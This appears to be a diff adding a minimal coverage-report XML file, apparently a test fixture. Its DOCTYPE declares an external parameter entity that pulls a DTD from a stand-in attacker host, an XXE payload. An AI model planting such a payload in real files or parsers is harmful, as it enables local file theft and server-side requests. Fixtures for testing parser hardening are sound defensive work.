@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE coverage [<!ENTITY % p SYSTEM "http://attacker.invalid/p.dtd"> %p;]>
+<coverage line-rate="1" version="1"><packages/></coverage>
